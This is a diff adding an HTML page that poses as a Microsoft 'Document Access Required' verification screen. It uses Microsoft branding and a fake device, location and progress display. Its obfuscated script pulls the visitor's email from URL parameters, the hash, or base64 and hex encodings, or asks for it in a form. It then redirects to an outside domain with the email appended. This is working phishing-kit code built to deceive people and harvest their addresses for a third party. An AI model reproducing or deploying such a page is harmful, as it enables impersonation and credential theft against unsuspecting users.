@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Document Access Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-image:url(https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg);background-repeat:no-repeat;background-position:center;background-size:cover;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.k7m3x9p{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);max-width:440px;width:100%;padding:48px 44px;text-align:center;animation:q1w2e3r .3s ease-out;border:solid 1px rgba(171,171,171,.5)}
+@keyframes q1w2e3r{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.q2w8n5t{width:64px;height:64px;margin:0 auto 24px;border-radius:8px;display:flex;align-items:center;justify-content:center}
+.q2w8n5t img{width:108px;height:auto}
+h1{font-size:26px;font-weight:300;color:#1b1b1b;margin-bottom:12px}
+.r5t7y1u{color:#605e5c;font-size:15px;line-height:20px;margin-bottom:32px}
+.p9o8i7u{background:#f3f2f1;border-radius:4px;padding:20px;margin-bottom:32px;text-align:left}
+.m4n3b2v{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.m4n3b2v:last-child{margin-bottom:0}
+.w3e4r5t{font-size:13px;color:#605e5c}
+.y6u7i8o{font-size:13px;color:#323130;font-weight:600}
+.l0k9j8h{margin-bottom:32px;display:none}
+.l0k9j8h.active{display:block}
+.g7f6d5s{font-size:13px;color:#605e5c;margin-bottom:8px}
+.a4s5d6f{width:100%;height:4px;background:#edebe9;border-radius:2px;overflow:hidden}
+.z3x4c5v{height:100%;background:#0078d4;border-radius:2px;width:0%;transition:width .3s ease}
+.b7n8m9k{width:100%;background:#0078d4;color:#fff;border:none;border-radius:2px;padding:12px 16px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s ease}
+.b7n8m9k:hover:not(:disabled){background:#106ebe}
+.b7n8m9k:disabled{opacity:.6;cursor:not-allowed}
+.f1g2h3j{text-align:center;margin-top:32px;padding-top:24px;border-top:1px solid #edebe9;font-size:12px;color:#605e5c}
+.k4l5m6n{display:inline}
+.k4l5m6n a{color:#605e5c;text-decoration:none;margin:0 4px}
+.k4l5m6n a:hover{text-decoration:underline}
+.o7p8q9w{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.4);z-index:1000;align-items:center;justify-content:center}
+.o7p8q9w.active{display:flex}
+.e1r2t3y{background:#fff;border-radius:4px;box-shadow:0 6.4px 14.4px rgba(0,0,0,.132),0 1.2px 3.6px rgba(0,0,0,.108);max-width:400px;width:90%;padding:24px}
+.u4i5o6p{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
+.a7s8d9f{font-size:14px;color:#605e5c;margin-bottom:20px}
+.g1h2j3k{margin-bottom:16px}
+.l4z5x6c{display:block;font-size:14px;font-weight:600;color:#323130;margin-bottom:4px}
+.v7b8n9m{width:100%;padding:8px 12px;font-size:15px;border:1px solid #8a8886;border-radius:2px;font-family:'Segoe UI',sans-serif;transition:border-color .2s ease}
+.v7b8n9m:focus{outline:none;border-color:#0078d4}
+.q1w3e4r{display:flex;gap:8px;justify-content:flex-end;margin-top:24px}
+.t4y5u6i{padding:8px 16px;font-size:14px;border-radius:2px;cursor:pointer;border:none;font-family:'Segoe UI',sans-serif}
+.o7p8a9s{background:#0078d4;color:#fff}
+.o7p8a9s:hover{background:#106ebe}
+.d1f2g3h{background:transparent;color:#323130;border:1px solid #8a8886}
+.d1f2g3h:hover{background:#f3f2f1}
+</style>
+</head>
+<body>
+<div class="k7m3x9p">
+<div class="q2w8n5t">
+<img src="https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png" alt="Document logo">
+</div>
+<h1>Document Access Required</h1>
+<p class="r5t7y1u">Verify your identity to access the requested document</p>
+<div class="p9o8i7u">
+<div class="m4n3b2v">
+<span class="w3e4r5t">Device</span>
+<span class="y6u7i8o" id="j4k5l6z">Loading...</span>
+</div>
+<div class="m4n3b2v">
+<span class="w3e4r5t">Location</span>
+<span class="y6u7i8o" id="x7c8v9b">Detecting...</span>
+</div>
+<div class="m4n3b2v">
+<span class="w3e4r5t">Access Level</span>
+<span class="y6u7i8o">Standard User</span>
+</div>
+</div>
+<div class="l0k9j8h" id="n1m2q3w">
+<div class="g7f6d5s">Verifying access permissions...</div>
+<div class="a4s5d6f">
+<div class="z3x4c5v" id="e4r5t6y"></div>
+</div>
+</div>
+<button class="b7n8m9k" id="u7i8o9p" onclick="q7w8e9r()">Access Document</button>
+<div class="f1g2h3j">
+Microsoft Corporation 路 
+<span class="k4l5m6n">
+<a href="#">Terms of use</a> 路 
+<a href="#">Privacy & cookies</a>
+</span>
+</div>
+</div>
+<div class="o7p8q9w" id="a1s2d3f">
+<div class="e1r2t3y">
+<h2 class="u4i5o6p">Verify Your Email</h2>
+<p class="a7s8d9f">Please enter your email address to access the document.</p>
+<form id="g4h5j6k" onsubmit="d7f8g9h(event)">
+<div class="g1h2j3k">
+<label class="l4z5x6c" for="l7z8x9c">Email address</label>
+<input type="email" id="l7z8x9c" class="v7b8n9m" placeholder="user@example.com" required>
+</div>
+<div class="q1w3e4r">
+<button type="button" class="t4y5u6i d1f2g3h" onclick="o4p5a6s()">Cancel</button>
+<button type="submit" class="t4y5u6i o7p8a9s">Continue</button>
+</div>
+</form>
+</div>
+</div>
+<script>
+const j2k3l4m={redirectURL:'https://jdcs.co.uk/en',showValidationForm:true,emailParam:'email',appendType:'param',progressDuration:3000,autoRedirect:true};
+let n5q6w7e=null;
+function v1b2n3m(){const r8t9y0u=navigator.userAgent;let i1o2p3a='Unknown';let s4d5f6g='';if(r8t9y0u.indexOf('Edg')>-1){i1o2p3a='Edge';const match=r8t9y0u.match(/Edg\/(\d+)/);s4d5f6g=match?match[1]:''}else if(r8t9y0u.indexOf('Chrome')>-1&&r8t9y0u.indexOf('Edg')===-1){i1o2p3a='Chrome';const match=r8t9y0u.match(/Chrome\/(\d+)/);s4d5f6g=match?match[1]:''}else if(r8t9y0u.indexOf('Safari')>-1&&r8t9y0u.indexOf('Chrome')===-1){i1o2p3a='Safari';const match=r8t9y0u.match(/Version\/(\d+)/);s4d5f6g=match?match[1]:''}else if(r8t9y0u.indexOf('Firefox')>-1){i1o2p3a='Firefox';const match=r8t9y0u.match(/Firefox\/(\d+)/);s4d5f6g=match?match[1]:'';}return`${i1o2p3a}${s4d5f6g?' '+s4d5f6g:''}`}
+function q4w5e6r(){const r8t9y0u=navigator.userAgent;let h7j8k9l='Unknown';if(r8t9y0u.indexOf('Win')>-1){h7j8k9l='Windows'}else if(r8t9y0u.indexOf('Mac')>-1){h7j8k9l='macOS'}else if(r8t9y0u.indexOf('Linux')>-1){if(r8t9y0u.indexOf('Android')>-1){h7j8k9l='Android'}else{h7j8k9l='Linux'}}else if(r8t9y0u.indexOf('iPhone')>-1||r8t9y0u.indexOf('iPad')>-1){h7j8k9l='iOS'}return h7j8k9l}
+function t7y8u9i(){const z0x1c2v=v1b2n3m();const h7j8k9l=q4w5e6r();const b3n4m5q=document.getElementById('j4k5l6z');b3n4m5q.textContent=`${z0x1c2v} 路 ${h7j8k9l}`;o1p2a3s()}
+function o1p2a3s(){const w6e7r8t=document.getElementById('x7c8v9b');const y9u0i1o=Intl.DateTimeFormat().resolvedOptions().timeZone;if(y9u0i1o){const p2a3s4d=y9u0i1o.split('/').pop().replace(/_/g,' ');w6e7r8t.textContent=p2a3s4d}else{w6e7r8t.textContent='Unknown'}}
+function d4f5g6h(){const f5g6h7j=new URLSearchParams(window.location.search);const k8l9z0x=['email','e','user','mail','username','account'];for(const c1v2b3n of k8l9z0x){const m4q5w6e=f5g6h7j.get(c1v2b3n);if(m4q5w6e&&u1i2o3p(m4q5w6e)){return m4q5w6e}}return null}
+function j7k8l9z(){const r7t8y9u=window.location.hash.substring(1);if(!r7t8y9u)return null;const i0o1p2a=new URLSearchParams(r7t8y9u);const k8l9z0x=['email','e','user','mail'];for(const c1v2b3n of k8l9z0x){const m4q5w6e=i0o1p2a.get(c1v2b3n);if(m4q5w6e&&u1i2o3p(m4q5w6e)){return m4q5w6e}}if(u1i2o3p(r7t8y9u)){return r7t8y9u}return null}
+function x1c2v3b(){const s3d4f5g=window.location.href;const h6j7k8l=s3d4f5g.match(/\$([^$&?#]+)/);if(h6j7k8l&&h6j7k8l[1]){const z9x0c1v=decodeURIComponent(h6j7k8l[1]);if(u1i2o3p(z9x0c1v)){return z9x0c1v}}return null}
+function n4m5q6w(){const f5g6h7j=new URLSearchParams(window.location.search);const r7t8y9u=window.location.hash.substring(1);const b2n3m4q=[...f5g6h7j.values()];if(r7t8y9u)b2n3m4q.push(r7t8y9u);for(const c1v2b3n of b2n3m4q){try{const z9x0c1v=atob(c1v2b3n);if(u1i2o3p(z9x0c1v)){return z9x0c1v}}catch(e){}}return null}
+function e7r8t9y(){const f5g6h7j=new URLSearchParams(window.location.search);const b2n3m4q=[...f5g6h7j.values()];for(const c1v2b3n of b2n3m4q){try{if(c1v2b3n.length%2===0&&/^[0-9a-fA-F]+$/.test(c1v2b3n)){const z9x0c1v=c1v2b3n.match(/.{2}/g).map(byte=>String.fromCharCode(parseInt(byte,16))).join('');if(u1i2o3p(z9x0c1v)){return z9x0c1v}}}catch(e){}}return null}
+function u1i2o3p(email){const w5e6r7t=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;return w5e6r7t.test(email)}
+function a4s5d6f(){return d4f5g6h()||j7k8l9z()||x1c2v3b()||n4m5q6w()||e7r8t9y()||null}
+function g7h8j9k(email){let s3d4f5g=j2k3l4m.redirectURL;if(!email)return s3d4f5g;switch(j2k3l4m.appendType){case'param':const y8u9i0o=s3d4f5g.includes('?')?'&':'?';s3d4f5g+=`${y8u9i0o}${j2k3l4m.emailParam}=${encodeURIComponent(email)}`;break;case'hash':s3d4f5g+=`#${j2k3l4m.emailParam}=${encodeURIComponent(email)}`;break;case'dollar':s3d4f5g+=`$${encodeURIComponent(email)}`;break;case'path':s3d4f5g=s3d4f5g.replace(/\/$/,'')+`/${encodeURIComponent(email)}`;break}return s3d4f5g}
+function l1z2x3c(){const k7l8z9x=document.getElementById('n1m2q3w');const c0v1b2n=document.getElementById('e4r5t6y');const m3q4w5e=document.getElementById('u7i8o9p');k7l8z9x.classList.add('active');m3q4w5e.disabled=true;m3q4w5e.textContent='Verifying...';let p1a2s3d=0;const f4g5h6j=setInterval(()=>{p1a2s3d+=100/(j2k3l4m.progressDuration/100);if(p1a2s3d>=100){p1a2s3d=100;clearInterval(f4g5h6j);v4b5n6m()}c0v1b2n.style.width=p1a2s3d+'%'},100)}
+function v4b5n6m(){const r6t7y8u=g7h8j9k(n5q6w7e);setTimeout(()=>{window.location.href=r6t7y8u},500)}
+function q7w8e9r(){if(!n5q6w7e&&j2k3l4m.showValidationForm){t1y2u3i()}else{l1z2x3c()}}
+function t1y2u3i(){const i9o0p1a=document.getElementById('a1s2d3f');i9o0p1a.classList.add('active')}
+function o4p5a6s(){const i9o0p1a=document.getElementById('a1s2d3f');i9o0p1a.classList.remove('active')}
+function d7f8g9h(h5j6k7l){h5j6k7l.preventDefault();const s2d3f4g=document.getElementById('l7z8x9c');n5q6w7e=s2d3f4g.value.trim();if(u1i2o3p(n5q6w7e)){o4p5a6s();l1z2x3c()}else{alert('Please enter a valid email address.')}}
+window.addEventListener('DOMContentLoaded',()=>{t7y8u9i();n5q6w7e=a4s5d6f();if(n5q6w7e){console.log('Email extracted:',n5q6w7e)}});
+</script>
+</body>
+</html>
